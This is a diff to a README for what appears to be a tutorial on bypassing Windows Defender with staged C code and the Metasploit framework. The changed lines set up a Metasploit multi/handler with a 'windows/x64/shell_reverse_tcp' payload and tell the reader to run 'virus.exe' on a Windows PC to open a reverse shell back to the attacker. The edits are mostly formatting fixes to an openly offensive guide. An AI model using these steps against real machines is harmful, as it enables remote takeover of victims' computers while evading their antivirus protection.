@@ -97,7 +97,7 @@ Bypass Windows Defender with a staged C code &amp; metasploit framework
    msfconsole
 ```
 ```
-   use exploit multi/handler
+   use multi/handler
    ```
 ```
    set payload windows/x64/shell_reverse_tcp
@@ -126,7 +126,7 @@ Bypass Windows Defender with a staged C code &amp; metasploit framework
 
    ## ⚠️ don't forget the -mwindows parameter
 
-  ## 😈 Now, run the virus.exe file on your Windows PC, and regardless of the network you are connected to, the TCP connection to metasploit will be established
+# 😈 Now, run the virus.exe file on your Windows PC, and regardless of the network you are connected to, the TCP connection to metasploit will be established
 
   
 
